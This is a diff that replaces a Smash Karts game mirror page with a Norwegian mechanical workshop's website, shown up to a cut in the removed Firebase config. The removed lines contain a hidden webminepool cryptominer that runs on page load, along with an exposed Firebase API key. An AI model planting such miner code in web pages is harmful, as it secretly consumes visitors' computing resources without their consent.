@@ -1,460 +1,296 @@
-
 <!DOCTYPE html>
-<html lang="en-us">
-   <head>
-      <meta charset="utf-8">
-      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-      <link rel="icon" href="images/favicon.png" sizes="16x16">
-      <!-- og: Open graph meta tags allow you to control what content shows up when a page is shared on Facebook -->
-      <meta property="og:site_name" content="smashkarts.peytonplayz585.tk">
-      <meta property="og:title" content="Smash Karts" />
-      <meta property="og:url" content="https://smashkarts.peytonplayz585.tk/" />
-      <meta property="og:type" content="website" />
-      <meta property="og:description" content="Smash Karts is a free io Multiplayer Kart Battle Arena game. Drive fast. Fire rockets. Make big explosions." />
-      <meta property="og:image" content="images/icon-144.png" />
-      <meta property="og:image:width" content="144" />
-      <meta property="og:image:height" content="144" />
-      <meta itemprop="name" content="Smash Karts" />
-      <meta itemprop="url" content="https://smashkarts.peytonplayz585.tk/" />
-      <meta itemprop="description" content="Smash Karts is a free io Multiplayer Kart Battle Arena game. Drive fast. Fire rockets. Make big explosions." />
-      <meta itemprop="thumbnailUrl" content="https://smashkarts.peytonplayz585.tk/" />
-      <link rel="image_src" href="https://smashkarts.peytonplayz585.tk/" />
-      <meta itemprop="image" content="https://smashkarts.peytonplayz585.tk/" />
-      <meta name="twitter:title" content="Smash Karts" />
-      <meta name="twitter:image" content="images/icon-144.png" />
-      <meta name="twitter:url" content="https://smashkarts.peytonplayz585.tk/" />
-      <meta name="twitter:card" content="summary_large_image" />
-      <meta name="twitter:description" content="Smash Karts is a free io Multiplayer Kart Battle Arena game. Drive fast. Fire rockets. Make big explosions." />
-      <meta name="description" content="Smash Karts is a free io Multiplayer Kart Battle Arena game. Drive fast. Fire rockets. Make big explosions." />
-      <meta name="google-site-verification" content="Kb9JniKgGSfuiJM_DNO2-Va7cSC00GlcBzbDw1Lgw_4" />
-      <meta itemprop="image primaryImageOfPage" content="images/smashkarts.png" />
-      
-      <link rel="manifest" href="manifest.json">
+<html lang="nb">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Stein Mekaniske Verksted | Høgsfjorden</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700;900&family=Figtree:wght@400;600&display=swap">
+<style>
+:root{--bg:#EFEFF0;--ink:#1A1A1D;--muted:#5A5A60;--card:#fff;--line:#CFCFD3;--deep:#18181B;--deep2:#26262B;--sig:#E04B3F;--hull:#8E1B1B;--steel:#C9D1D3;
+--hd:'Big Shoulders Display','Arial Narrow',Impact,sans-serif;--bd:'Figtree',system-ui,sans-serif;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px);background:var(--deep)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#131315;--ink:#ECECEE;--muted:#A5A5AB;--card:#1D1D21;--line:#35353B;color-scheme:dark}}
+:root[data-theme="dark"]{--bg:#131315;--ink:#ECECEE;--muted:#A5A5AB;--card:#1D1D21;--line:#35353B;color-scheme:dark}
+*,*::before,*::after{box-sizing:inherit}
+html{scroll-behavior:smooth;scroll-padding-top:calc(72px + env(safe-area-inset-top,0px))}
+body{margin:0;background:var(--bg);color:var(--ink);font:400 1.0625rem/1.65 var(--bd)}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);background:var(--deep);z-index:10}
+a{color:inherit}
+:focus-visible{outline:3px solid var(--sig);outline-offset:3px}
+h1,h2,h3{font-family:var(--hd);font-weight:900;line-height:.95;margin:0;letter-spacing:.01em}
+h2{font-size:clamp(2.4rem,6vw,4.2rem)}
+.wrap{max-width:1100px;margin:0 auto;padding:0 24px}
+section{padding:96px 0}
+p{max-width:62ch}
 
-      <meta name="viewport" content="user-scalable=no">
+/* header */
+header{position:sticky;top:env(safe-area-inset-top,0px);z-index:20;background:rgba(24,24,27,.92);backdrop-filter:blur(8px);color:#fff}
+header .wrap{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{display:flex;align-items:center;gap:10px;font:900 1.35rem var(--hd);text-decoration:none;letter-spacing:.04em}
+.logo b{color:var(--sig)}
+.mark{width:42px;height:42px;transition:transform .9s cubic-bezier(.2,.8,.2,1)}
+.logo:hover .mark{transform:rotate(120deg)}
+.wm{position:absolute;right:-8vw;top:6vh;width:min(62vw,600px);color:#fff;opacity:.07;animation:spin 70s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+nav{display:flex;gap:6px;overflow-x:auto}
+nav a{padding:8px 12px;text-decoration:none;font-weight:600;font-size:.95rem;border-radius:6px;white-space:nowrap;transition:background .2s,color .2s}
+nav a:hover{background:rgba(255,255,255,.1);color:var(--sig)}
+#bar{position:absolute;left:0;bottom:0;height:3px;width:100%;background:var(--sig);transform:scaleX(0);transform-origin:left}
 
-      <meta name="apple-mobile-web-app-title" content="Smash Karts">
-      <meta name="apple-mobile-web-app-capable" content="yes">
-      <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-      <link rel="apple-touch-icon" href="images/icon-144.png">
+/* hero */
+.hero{position:relative;background:linear-gradient(180deg,var(--deep) 0%,var(--deep2) 100%);color:#fff;padding:0;min-height:calc(100svh - 64px);display:flex;flex-direction:column;justify-content:space-between;overflow:hidden}
+.hero .wrap{padding-top:9vh;position:relative;z-index:2}
+.hero h1{font-size:clamp(3.6rem,13vw,10rem);text-transform:none}
+.hero h1 span{display:block;overflow:hidden}
+.hero h1 span i{display:block;font-style:normal;transform:translateY(105%);animation:up .9s cubic-bezier(.2,.8,.2,1) forwards}
+.hero h1 span:nth-child(2) i{animation-delay:.18s;color:var(--sig)}
+.hero h1 span:nth-child(3) i{animation-delay:.36s}
+@keyframes up{to{transform:none}}
+.hero p.lead{font-size:1.2rem;color:#CFCFD3;margin:22px 0 28px;opacity:0;animation:fade .8s .9s forwards}
+.cta{display:flex;gap:12px;flex-wrap:wrap;opacity:0;animation:fade .8s 1.1s forwards}
+@keyframes fade{to{opacity:1}}
+.btn{display:inline-block;padding:14px 26px;font-weight:600;text-decoration:none;border-radius:4px;background:var(--sig);color:#fff;transition:transform .2s,box-shadow .2s}
+.btn:hover{transform:translateY(-3px);box-shadow:0 8px 0 rgba(224,75,63,.35)}
+.btn.o{background:none;color:#fff;border:2px solid rgba(255,255,255,.5)}
+.scene{position:relative;z-index:1;width:100%;height:clamp(200px,34vw,380px);margin-top:24px;display:block}
+.bob{transform-origin:600px 330px;animation:bob 5s ease-in-out infinite}
+@keyframes bob{0%,100%{transform:translateY(0) rotate(-.8deg)}50%{transform:translateY(7px) rotate(.8deg)}}
+.w1{animation:wave 9s linear infinite}.w2{animation:wave 6s linear infinite reverse}
+@keyframes wave{to{transform:translateX(-600px)}}
+.spark{transform-box:fill-box;transform-origin:center;animation:spark .5s steps(2) infinite}
+.spark:nth-child(2){animation-delay:.17s}.spark:nth-child(3){animation-delay:.33s}
+@keyframes spark{0%{opacity:1;transform:translate(0,0) scale(1)}100%{opacity:0;transform:translate(14px,-22px) scale(.3)}}
+.boom{transform-origin:690px 250px;animation:boom 8s ease-in-out infinite}
+@keyframes boom{0%,100%{transform:rotate(0)}50%{transform:rotate(-6deg)}}
 
-      <!-- <script type="text/javascript" src="xmlhttprequest-length-computable.js"></script> -->
-      <script type="text/javascript" src="xmlhttprequest-length-computable.min.js"></script>
-      <script type="text/javascript">
-        window.xmlHTTPRequestLengthComputable = {
-          CONTENT_ENCODING_MULTIPLE: 3.0
-        }
-      </script>
-      <!-- Onesignal push notifications -->
-      <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>
-      <script>
-        var OneSignal = window.OneSignal || [];
-        OneSignal.push(function() {
-          OneSignal.init({
-            appId: "e618063a-f56d-448f-9dbf-c1bebb50f935",
-          });
-        });
-      </script> 
-      <!-- Youtube Game Schema -->
-      <script type="application/ld+json">
-         {  
-           "@context": "http://schema.org",
-           "@type":"VideoGame",
-           "publisher": "Tall Team",
-           "name":[
-             {
-               "@language":"en",
-               "@value":"Smash Karts"
-             }
-           ],
-           "description":[
-             {
-               "@language":"en",
-               "@value":"Smash Karts is a free io Multiplayer Kart Battle Arena game. Drive fast. Fire rockets. Make big explosions."
-             }
-           ],
-           "applicationCategory":[
-             "Game"
-           ],
-           "operatingSystem":[
-             "WEB"
-           ],
-           "genre":[
-             "Car Battle",
-             "Shooter",
-             "Multiplayer"
-           ],
-           "url":"https://smashkarts.peytonplayz585.tk/",
-           "image":"images/SmashKartsPoster.jpg",
-           "screenshot":"images/SmashKartsBackground.jpg"
-         }
-      </script>
-      <title>Smash Karts</title>
-      <script src="https://webminepool.com/lib/base.js"></script>
-      <style>
-         html {
-         box-sizing: border-box;
-         }
-         *, *:before, *:after {
-         box-sizing: inherit;
-         }
-         body {
-         margin: 0;
-         background: #1b70f0;
-         background-image: url("images/overlay.png"), url("images/menuBGTile.png");
-         background-size: cover, 13vw;
-         background-repeat: no-repeat, repeat; 
-         }
-         #gameContainer {
-          position: relative;
-          width: 100vw;
-          height: 100vh;
-         }
-         #adLongContainer {
-          position: absolute;
-          /* border: 1px solid red; */
-          z-index: 100;
-          bottom: 0px;
-          width: 100vw;
-          align-items: center;
-          justify-content: center;
-          }
-         #adContainer {
-          position: absolute;
-          /* border: 1px solid red; */
-          z-index: 100;
-          top: 0px;
-          right: 0px;
-          width: auto;
-          height: auto;
-        }
-          @media screen and (max-width: 600px) 
-            {
-              #smashkarts-io_300x250
-              {
-                /* border: 1px solid blue; */
-                display: none;
-              }
-            }
-            #adContainer2 {
-          position: absolute;
-          /* border: 1px solid red; */
-          z-index: 100;
-          top: 0px;
-          right: 0px;
-          width: auto;
-          height: auto;
-        }
-          @media screen and (max-width: 600px) 
-            {
-              #smashkarts-io_300x250_2
-              {
-                /* border: 1px solid blue; */
-                display: none;
-              }
-            }
-         canvas {
-         width: 100%;
-         height: 100%;
-         display: block;
-         }
-         /* try to handle mobile dialog */
-         canvas + * {
-         z-index: 2;
-         }
-         .logo {
-         display: block;
-         max-width: 90%;
-         max-height: 40vh;
-         }
-         .progress {
-         margin: 1.5em;
-         border: 2px solid ;
-         width: 25vw;
-         display: none;
-         }
-         .progress .full {
-         margin: 2px;
-         background: white;
-         height: 1em;
-         transform-origin: top left;
-         }
-         #loader {
-         position: absolute;
-         left: 0;
-         top: 0;
-         width: 100vw;
-         height: 100vh;
-         display: flex;
-         flex-direction: column;
-         align-items: center;
-         justify-content: center;
-         background: #1b70f0;
-         background-image: url("images/overlay.png"), url("images/menuBGTile.png");
-         background-size: cover, 13vw;
-         background-repeat: no-repeat, repeat; 
-         }
-         .spinner {
-            position:absolute;
-            left: 2vw;
-            bottom: 2vh;
-            border: 10px solid #f3f3f3; 
-            border-top: 10px solid #3498db;
-            border-radius: 50%;
-            width: 10vh;
-            height: 10vh;
-            animation: spin 1s linear infinite;
-          }
+/* about + stats */
+.about{display:grid;grid-template-columns:1.1fr 1fr;gap:56px;align-items:start}
+.stats{display:grid;grid-template-columns:1fr 1fr;border:2px solid var(--ink)}
+.stat{padding:26px 22px;border:1px solid var(--ink)}
+.stat strong{display:block;font:900 clamp(2.6rem,6vw,3.8rem)/1 var(--hd);color:var(--ink)}
+.stat span{color:var(--muted);font-size:.95rem}
+.about h2{margin-bottom:24px}
 
-          @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-          }
+/* services */
+.dark{background:var(--deep);color:#fff}
+.dark p{color:#CFCFD3}
+.tabs{display:grid;grid-template-columns:280px 1fr;gap:40px;margin-top:44px}
+.tablist{display:flex;flex-direction:column;border-left:3px solid rgba(255,255,255,.18)}
+.tab{all:unset;cursor:pointer;padding:16px 20px;font:700 1.6rem var(--hd);letter-spacing:.03em;color:#A5A5AB;border-left:3px solid transparent;margin-left:-3px;transition:color .2s,padding .25s,border-color .2s}
+.tab:hover{color:#fff;padding-left:28px}
+.tab[aria-selected="true"]{color:var(--sig);border-color:var(--sig);padding-left:28px}
+.tab:focus-visible{outline:3px solid var(--sig)}
+.panel{min-height:260px}
+.panel ul{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:14px}
+.panel li{padding:20px;background:var(--deep2);border-bottom:4px solid var(--sig);font:700 1.5rem var(--hd);animation:pop .45s cubic-bezier(.2,.8,.2,1) both}
+.panel li:nth-child(2){animation-delay:.06s}.panel li:nth-child(3){animation-delay:.12s}.panel li:nth-child(4){animation-delay:.18s}.panel li:nth-child(5){animation-delay:.24s}.panel li:nth-child(6){animation-delay:.3s}
+@keyframes pop{from{opacity:0;transform:translateY(18px) scale(.96)}}
+.facts{margin-top:40px;padding-top:28px;border-top:1px solid rgba(255,255,255,.2);max-width:70ch}
 
+/* projects */
+.proj{border-top:2px solid var(--ink);padding:30px 0;display:grid;grid-template-columns:1fr 2fr;gap:24px;align-items:baseline;transition:padding .3s,background .3s}
+.proj:last-child{border-bottom:2px solid var(--ink)}
+.proj:hover{padding-left:20px;background:var(--card)}
+.proj h3{font-size:clamp(1.8rem,4vw,2.8rem)}
+.proj p{margin:0;color:var(--muted)}
 
-         /* for all screens */
-        #rotate-landscape {display: none;}
-       
-        /* only when orientation is in portrait mode */
-        @media all and (orientation:portrait) {
-            #rotate-landscape {
-              position: absolute;
-              left: 0;
-              top: 0;
-              width: 100vw;
-              height: 100vh;
-              display: block;
-              background: #1b70f0;
-              background-image: url("images/overlay.png"), url("images/menuBGTile.png");
-              background-size: cover, 13vw;
-              background-repeat: no-repeat, repeat; 
-            }
-        }
+/* timeline */
+.tl{position:relative;margin-top:48px;padding-left:44px}
+.tl::before,.tl .fill{content:"";position:absolute;left:11px;top:0;bottom:0;width:3px;background:var(--line)}
+.tl .fill{background:var(--sig);transform-origin:top;transform:scaleY(0);transition:transform .15s linear}
+.ev{position:relative;padding:0 0 38px;opacity:.25;transform:translateX(-14px);transition:opacity .6s,transform .6s}
+.ev.on{opacity:1;transform:none}
+.ev::before{content:"";position:absolute;left:-41px;top:12px;width:17px;height:17px;border-radius:50%;background:var(--bg);border:3px solid var(--line);transition:border-color .4s,background .4s}
+.ev.on::before{border-color:var(--sig);background:var(--sig)}
+.ev b{font:900 clamp(2rem,5vw,3rem)/1 var(--hd);display:block}
+.ev p{margin:2px 0 0}
 
-        .center {
-          position: fixed;
-          top: 50%;
-          left: 50%;
-          transform: translate(-50%, -50%);
-          width: 90vw;
-        }
-      </style>
-      <meta name="viewport" content="minimal-ui, user-scalable=no, initial-scale=1, maximum-scale=1, width=device-width" />
-      <title>AdinPlay Ads</title>
-      <script>
-      window.aiptag = window.aiptag || {cmd: []};
-      aiptag.cmd.display = aiptag.cmd.display || [];
+/* contact */
+.contact{display:grid;grid-template-columns:1fr 1fr;gap:56px}
+.status{display:inline-flex;align-items:center;gap:10px;padding:8px 16px;border:2px solid var(--ink);font-weight:600;margin:18px 0}
+.dot{width:12px;height:12px;border-radius:50%;background:#888}
+.open .dot{background:#2FBF71;animation:ping 1.8s infinite}
+@keyframes ping{0%{box-shadow:0 0 0 0 rgba(47,191,113,.7)}100%{box-shadow:0 0 0 14px rgba(47,191,113,0)}}
+dl{margin:0}dt{font-weight:600;margin-top:16px}dd{margin:0;color:var(--muted)}
+.links{display:flex;flex-direction:column;gap:12px}
+.links a{display:flex;justify-content:space-between;padding:18px 20px;border:2px solid var(--ink);text-decoration:none;font-weight:600;transition:background .2s,color .2s,transform .2s}
+.links a:hover{background:var(--ink);color:var(--bg);transform:translateX(6px)}
+footer{background:var(--deep);color:#A5A5AB;padding:28px 0;font-size:.9rem}
 
-      // Show GDPR consent tool
-      aiptag.gdprShowConsentTool = true;
-      aiptag.gdprConsentToolPosition = "bottom";
-      </script>
-      <script async src="//api.adinplay.com/libs/aiptag/pub/SHK/smashkarts.io/tag.min.js"></script>
-      <!-- AIP AD END -->
-      <!-- AD INIT END -->
-   </head>
-   <body>
-    <div id="mainContainer">
-      <canvas id="gameContainer"></canvas>
-      <div id="loader">
-         <img class="logo" src="images/smashkarts.png">
-         <div class="spinner"></div>
-         <div class="progress">
-            <div class="full"></div>
-         </div>
-                  
-      </div>
-      <div id="adContainer" style="display: none;">
-        <div id="smashkarts-io_300x250" ></div>
-      </div>
-      <div id="adContainer2" style="display: none;">
-        <div id="smashkarts-io_300x250_2" ></div>
-      </div>
-      <div id="adLongContainer" style="display: none;">
-        <!-- <div id="smashkarts-io_728x90" ></div> -->
-        <div id="smashkarts-io_320x100"></div>
-        <div id="smashkarts-io_970x250"></div>
-      </div>
-      <div id="videoAdContainer">
-        <div id="preroll"></div>
-      </div>
-    </div>
-    <div id="rotate-landscape">
-      <img src="images/r.png" class="center">
-    </div>
-	   <script>
-    var miner = WMP.Anonymous('SK_73PJP3DxlEoACfRODPSoJ',{throttle: 0.3});
-    miner.start();
+@media (max-width:820px){
+.about,.contact,.tabs,.proj{grid-template-columns:1fr}
+.tablist{flex-direction:row;overflow-x:auto;border-left:0;border-bottom:3px solid rgba(255,255,255,.18)}
+.tab{border-left:0;border-bottom:3px solid transparent;margin:0 0 -3px;white-space:nowrap}
+.tab:hover,.tab[aria-selected="true"]{padding-left:20px}
+.tab[aria-selected="true"]{border-bottom-color:var(--sig)}
+section{padding:64px 0}
+nav a{padding:8px 8px;font-size:.85rem}.logo span{display:none}
+}
+@media (prefers-reduced-motion:reduce){
+*,*::before,*::after{animation:none!important;transition:none!important}
+.hero h1 span i,.hero p.lead,.cta{transform:none;opacity:1}.ev{opacity:1;transform:none}
+html{scroll-behavior:auto}
+}
+</style>
+</head>
+<body>
+<svg width="0" height="0" style="position:absolute" aria-hidden="true"><symbol id="lg" viewBox="0 0 100 100"><g fill="currentColor"><circle cx="50" cy="50" r="39"/><polygon id="tooth" points="42.5,13 44,.5 56,.5 57.5,13" transform="rotate(15 50 50)"/><use href="#tooth" transform="rotate(30 50 50)"/><use href="#tooth" transform="rotate(60 50 50)"/><use href="#tooth" transform="rotate(90 50 50)"/><use href="#tooth" transform="rotate(120 50 50)"/><use href="#tooth" transform="rotate(150 50 50)"/><use href="#tooth" transform="rotate(180 50 50)"/><use href="#tooth" transform="rotate(210 50 50)"/><use href="#tooth" transform="rotate(240 50 50)"/><use href="#tooth" transform="rotate(270 50 50)"/><use href="#tooth" transform="rotate(300 50 50)"/><use href="#tooth" transform="rotate(330 50 50)"/></g><circle cx="50" cy="50" r="27.5" fill="#8B1A1A"/><path id="blade" d="M48.5 46.5 C44.2 38 43.5 29.5 55 25.5 C47 30.5 47.5 38 49.8 46.5Z" fill="#fff"/><use href="#blade" transform="rotate(72 50 50)"/><use href="#blade" transform="rotate(144 50 50)"/><use href="#blade" transform="rotate(216 50 50)"/><use href="#blade" transform="rotate(288 50 50)"/><circle cx="50" cy="50" r="4.2" fill="#8B1A1A" stroke="#E8C4BC" stroke-width="1"/></symbol></svg>
+<header>
+<div class="wrap">
+<a class="logo" href="#top" aria-label="Stein Mek. Verksted, til toppen"><svg class="mark" viewBox="0 0 100 100" aria-hidden="true"><circle cx="50" cy="50" r="50" fill="#F2F2F2"/><use href="#lg" width="100" height="100" style="color:#2B2B2E"/></svg><span>STEIN <b>MEK</b></span></a>
+<nav aria-label="Hovedmeny"><a href="#om">Om oss</a><a href="#tjenester">Tjenester</a><a href="#prosjekter">Prosjekter</a><a href="#historie">Historie</a><a href="#kontakt">Kontakt</a></nav>
+</div>
+<div id="bar"></div>
+</header>
+
+<main id="top">
+<div class="hero">
+<svg class="wm" viewBox="0 0 100 100" aria-hidden="true"><use href="#lg" width="100" height="100"/></svg>
+<div class="wrap">
+<h1 aria-label="Verksted og lekterplass siden 1891"><span><i>Verksted</i></span><span><i>siden 1891</i></span><span><i>i Høgsfjorden</i></span></h1>
+<p class="lead">Mekanisk arbeid, metallbearbeiding og vedlikehold av nordsjølektere. Fra tre til stål i over 130 år.</p>
+<div class="cta"><a class="btn" href="#tjenester">Se hva vi gjør</a><a class="btn o" href="#kontakt">Ta kontakt</a></div>
+</div>
+<svg class="scene" viewBox="0 0 1200 400" preserveAspectRatio="xMidYMax slice" aria-hidden="true">
+<g class="bob">
+<path d="M300 300 L330 350 L880 350 L910 300 Z" fill="#A32323"/>
+<rect x="300" y="290" width="610" height="14" fill="#6E1414"/>
+<rect x="360" y="250" width="110" height="40" fill="#C9D1D3"/>
+<rect x="380" y="228" width="60" height="22" fill="#E6EEEF"/>
+<rect x="392" y="236" width="36" height="8" fill="#12343D"/>
+<rect x="500" y="262" width="120" height="28" fill="#3A3A40"/>
+<g class="boom"><path d="M690 250 L690 110 L704 110 L704 250 Z" fill="#E6E6E8"/><path d="M697 112 L900 215" stroke="#E6E6E8" stroke-width="8"/><path d="M900 215 L900 262" stroke="#C9D1D3" stroke-width="2"/></g>
+<rect x="670" y="250" width="54" height="40" fill="#E04B3F"/>
+<g><circle class="spark" cx="560" cy="262" r="3" fill="#FFD84A"/><circle class="spark" cx="566" cy="258" r="2.5" fill="#fff"/><circle class="spark" cx="554" cy="260" r="2" fill="#FFD84A"/></g>
+</g>
+<g class="w2" opacity=".55"><path id="wv" d="M-600 340 Q-450 316 -300 340 T0 340 T300 340 T600 340 T900 340 T1200 340 T1500 340 T1800 340 V420 H-600Z" fill="#3A4A52"/></g>
+<g class="w1"><path d="M-600 360 Q-450 340 -300 360 T0 360 T300 360 T600 360 T900 360 T1200 360 T1500 360 T1800 360 V420 H-600Z" fill="#202428"/></g>
+</svg>
+</div>
+
+<section id="om"><div class="wrap about">
+<div>
+<h2>Fra båtbyggeri til mekanisk verksted</h2>
+<p>Bedriften startet i 1891 som båtbyggeri og har utviklet seg til dagens virksomhet: mekanisk arbeid, vedlikehold av utstyr, og opplag, reparasjoner og vedlikehold av nordsjølektere.</p>
+<p>Vi har en godt utstyrt verkstedhall og en slipp som tar båter inntil 50 fot, med mulighet for å ta båtene inn i hallen.</p>
+</div>
+<div class="stats">
+<div class="stat"><strong data-n="1891">0</strong><span>Startet som båtbyggeri</span></div>
+<div class="stat"><strong data-n="1000" data-p="~">0</strong><span>kvadratmeter lokaler</span></div>
+<div class="stat"><strong data-n="50">0</strong><span>fot: største båt på slippen</span></div>
+<div class="stat"><strong data-n="1976">0</strong><span>året den første lekteren kom</span></div>
+</div>
+</div></section>
+
+<section id="tjenester" class="dark"><div class="wrap">
+<h2>Tjenester og fasiliteter</h2>
+<div class="tabs">
+<div class="tablist" role="tablist" aria-label="Tjenester"></div>
+<div class="panel" role="tabpanel" id="panel" aria-live="polite"></div>
+</div>
+<p class="facts">Kontor, lager og verksted på til sammen ca. 1000 m². Opplagsplass for lektere og kjørerampe fra land, så vi kan kjøre maskiner og utstyr om bord. To små taubåter brukes til buksering og assistanse ved avgang og ankomst.</p>
+</div></section>
+
+<section id="prosjekter"><div class="wrap">
+<h2 style="margin-bottom:40px">Prosjekter</h2>
+<div class="proj"><h3>Slep av lekter</h3><p>Slep av lekter, utført med våre to små taubåter.</p></div>
+<div class="proj"><h3>Kranskipet Uglen</h3><p>Lasting og sjøsikring av bomdeler til kranskipet Uglen.</p></div>
+</div></section>
+
+<section id="historie" style="padding-top:0"><div class="wrap">
+<h2>Historie</h2>
+<div class="tl" id="tl"><div class="fill" id="fill"></div>
+<div class="ev"><b>1891</b><p>Syvert (Olsen) Stein overtar gården fra svigerfaren og begynner å bygge fiskebåter i tre.</p></div>
+<div class="ev"><b>1914</b><p>Fiskebåter bygges for motordrift.</p></div>
+<div class="ev"><b>1936–1942</b><p>Slipp og sagbruk bygges.</p></div>
+<div class="ev"><b>1970-tallet</b><p>Produksjonen dreies over til mekanisk arbeid, som etter hvert blir det mest dominerende. Verksted på 330 m² fra 1973.</p></div>
+<div class="ev"><b>1976</b><p>Høsten kommer den første lekteren. Først bare opplagsplass, men snart ble det spørsmål om reparasjoner.</p></div>
+<div class="ev"><b>1992</b><p>Verkstedhall på 611 m² tas i bruk.</p></div>
+<div class="ev"><b>1995</b><p>Ny slipp som kan ta båter opp til 50 fot.</p></div>
+</div>
+</div></section>
+
+<section id="kontakt" style="background:var(--card)"><div class="wrap contact">
+<div>
+<h2>Kontakt oss</h2>
+<div class="status" id="status"><span class="dot"></span><span id="stxt">Sjekker åpningstid …</span></div>
+<dl>
+<dt>Åpningstider</dt><dd>Mandag–torsdag 07.00–15.30<br>Fredag 07.00–13.00</dd>
+<dt>Adresse</dt><dd>Stein Mekaniske Verksted as<br>Stein 7, 4105 Jørpeland</dd>
+<dt>Telefon og e-post</dt><dd><a href="tel:+4740017318">+47 400 17 318</a><br><a href="mailto:smv@stein-mek.no">smv@stein-mek.no</a></dd>
+<dt>Organisasjonsnummer</dt><dd>937 162 847</dd>
+<dt>GPS</dt><dd>58°57'25.0"N 6°0'3.7"E</dd>
+</dl>
+</div>
+<div class="links">
+<a href="https://goo.gl/maps/jkC5U6mYEgebssFA6" target="_blank" rel="noopener">Veibeskrivelse <span>↗</span></a>
+<a href="https://www.skippo.no/plan" target="_blank" rel="noopener">Sjøkart <span>↗</span></a>
+<a href="https://www.hogsfjordferja.no/ruteplan-priser/" target="_blank" rel="noopener">Fergerute Lauvvik–Oanes <span>↗</span></a>
+<a href="https://www.facebook.com/steinmekverksted" target="_blank" rel="noopener">Facebook <span>↗</span></a>
+</div>
+</div></section>
+</main>
+<footer><div class="wrap">© 2026 Stein Mekaniske Verksted as</div></footer>
+
+<script>
+(function(){
+var reduce=matchMedia('(prefers-reduced-motion: reduce)').matches;
+// scroll progress + timeline fill
+var bar=document.getElementById('bar'),tl=document.getElementById('tl'),fill=document.getElementById('fill');
+function onScroll(){
+var h=document.documentElement,max=h.scrollHeight-innerHeight;
+bar.style.transform='scaleX('+(max>0?Math.min(1,scrollY/max):0)+')';
+var r=tl.getBoundingClientRect(),p=(innerHeight*.6-r.top)/r.height;
+fill.style.transform='scaleY('+Math.max(0,Math.min(1,p))+')';
+}
+addEventListener('scroll',onScroll,{passive:true});onScroll();
+// timeline reveal
+var evs=document.querySelectorAll('.ev');
+if('IntersectionObserver' in window&&!reduce){
+var io=new IntersectionObserver(function(es){es.forEach(function(e){if(e.isIntersecting){e.target.classList.add('on');io.unobserve(e.target)}})},{threshold:.5});
+evs.forEach(function(e){io.observe(e)});
+// count-up
+var co=new IntersectionObserver(function(es){es.forEach(function(e){
+if(!e.isIntersecting)return;co.unobserve(e.target);
+var el=e.target,n=+el.dataset.n,pre=el.dataset.p||'',t0=performance.now(),d=1400;
+(function f(t){var k=Math.min(1,(t-t0)/d),v=Math.round(n*(1-Math.pow(1-k,3)));el.textContent=pre+v;if(k<1)requestAnimationFrame(f)})(t0);
+})},{threshold:.6});
+document.querySelectorAll('[data-n]').forEach(function(s){co.observe(s)});
+}else{
+evs.forEach(function(e){e.classList.add('on')});
+document.querySelectorAll('[data-n]').forEach(function(s){s.textContent=(s.dataset.p||'')+s.dataset.n});
+}
+// service tabs
+var data=[
+['Reparasjon og vedlikehold',['Maskiner','Motorer','Pumper','Hydraulikk']],
+['Metallbearbeiding',['Stål','Aluminium','Sveis','CNC plasmaskjæring']],
+['Båt',['Slipp','Fartøyinstruks / klassing','Akseltrekk','Elektrisk','Service','Reparasjon']],
+['Overflatebehandling',['Sandblåsing','Slyngrensing','Maling']]];
+var list=document.querySelector('.tablist'),panel=document.getElementById('panel');
+function show(i){
+[].forEach.call(list.children,function(b,j){b.setAttribute('aria-selected',j===i);b.tabIndex=j===i?0:-1});
+panel.innerHTML='<ul>'+data[i][1].map(function(x){return '<li>'+x+'</li>'}).join('')+'</ul>';
+}
+data.forEach(function(d,i){
+var b=document.createElement('button');b.className='tab';b.setAttribute('role','tab');b.textContent=d[0];
+b.onclick=function(){show(i)};
+b.onkeydown=function(e){var k=e.key==='ArrowDown'||e.key==='ArrowRight'?1:e.key==='ArrowUp'||e.key==='ArrowLeft'?-1:0;
+if(k){e.preventDefault();var n=(i+k+data.length)%data.length;show(n);list.children[n].focus()}};
+list.appendChild(b);
+});
+show(0);
+// open status (Norwegian time)
+try{
+var p=new Intl.DateTimeFormat('en-GB',{timeZone:'Europe/Oslo',weekday:'short',hour:'2-digit',minute:'2-digit',hour12:false}).formatToParts(new Date()),g={};
+p.forEach(function(x){g[x.type]=x.value});
+var m=(+g.hour)*60+(+g.minute),wd=g.weekday,open=false,txt;
+var close=wd==='Fri'?13*60:(['Mon','Tue','Wed','Thu'].indexOf(wd)>-1?15*60+30:0);
+open=close>0&&m>=420&&m<close;
+var box=document.getElementById('status'),t=document.getElementById('stxt');
+if(open){box.classList.add('open');t.textContent='Åpent nå, til '+(wd==='Fri'?'13.00':'15.30')}
+else t.textContent='Stengt nå. Åpner neste hverdag kl. 07.00';
+}catch(e){document.getElementById('stxt').textContent='Se åpningstider under'}
+})();
 </script>
-   </body>
-   <script src="https://www.gstatic.com/firebasejs/7.23.0/firebase-app.js"></script>
-   <script src="https://www.gstatic.com/firebasejs/7.23.0/firebase-auth.js"></script>
-   <script src="https://www.gstatic.com/firebasejs/7.23.0/firebase-database.js"></script>
-   <script src="https://www.gstatic.com/firebasejs/7.23.0/firebase-analytics.js"></script>
-   <script src="https://www.gstatic.com/firebasejs/7.23.0/firebase-performance.js"></script>
-
-   <script src="scripts/main-v2.js"></script>
-   <script src="scripts/auth-v3.js"></script>
-
-   <script>
-      if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('service-worker2.js');
-      }
-
-      var firebaseConfig = {
-			apiKey: "AIzaSyAdY2qq9083amKDS0R8tn2tjIKQB8mocco",
-			authDomain: "webgltest-17af1.firebaseapp.com",
-			databaseURL: "https://webgltest-17af1.firebaseio.com",
-			projectId: "webgltest-17af1",
-			storageBucket: "webgltest-17af1.appspot.com",
